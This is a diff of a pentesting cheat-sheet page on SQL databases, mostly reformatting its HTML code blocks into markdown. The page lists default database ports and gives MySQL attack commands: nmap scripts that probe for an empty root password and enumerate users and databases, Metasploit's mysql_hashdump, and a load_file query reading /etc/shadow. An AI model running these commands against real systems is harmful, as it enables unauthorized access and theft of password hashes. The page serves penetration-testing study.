@@ -3,12 +3,7 @@ title: "SQL"
 description: ">-"
 ---
 
-
-
-
-:::note
 ### Relational databases default ports <a href="#relational-databases" id="relational-databases"></a>
-:::
 
 | Database               | Port(s)    | Doc                                                                                     |
 | ---------------------- | ---------- | --------------------------------------------------------------------------------------- |
@@ -18,9 +13,7 @@ description: ">-"
 | **PostgreSQL**         | 5432       | [Doc](https://www.postgresql.org/docs/9.1/static/runtime-config-connection.html)        |
 | **SQL Server (MSSQL)** | 1433, 1434 | [Doc](https://msdn.microsoft.com/de-ch/library/cc646023.aspx)                           |
 
-:::note
 ### NoSQL databases and other data stores  default ports <a href="#nosql-databases-and-other-data-stores" id="nosql-databases-and-other-data-stores"></a>
-:::
 
 | Database      | Port(s)                    | Doc                                                                                                  |
 | ------------- | -------------------------- | ---------------------------------------------------------------------------------------------------- |
@@ -33,20 +26,21 @@ description: ">-"
 
 ## Enum
 
-<pre class="language-bash"><code class="lang-bash"># Default scan
+```bash
+# Default scan
 nmap $IP -sV -p 3306 
 
 # Empty password script
 nmap $IP -sV -p 3306 --script=mysql-empty-password
 
-<strong># Get Mysql info
-</strong>nmap $IP -sV -p 3306 --script=mysql-info
+# Get Mysql info
+nmap $IP -sV -p 3306 --script=mysql-info
 
 # Get mysql users
 nmap $IP -sV -p 3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"
 
-<strong># Get mysql databases
-</strong>nmap $IP -sV -p 3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"
+# Get mysql databases
+nmap $IP -sV -p 3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"
 
 # Get mysql variables
 nmap $IP -sV -p 3306 --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"
@@ -73,7 +67,8 @@ use auxiliary/scanner/mysql/mysql_hashdump
 setg rhosts $IP
 set username root
 set password ""
-run</code></pre>
+run
+```
 
 #### Manipulate local files via db
 
@@ -83,7 +78,6 @@ mysql -h $IP -u root
 
 # read local file
 select load_file("/etc/shadow");
-
 
 ```
 
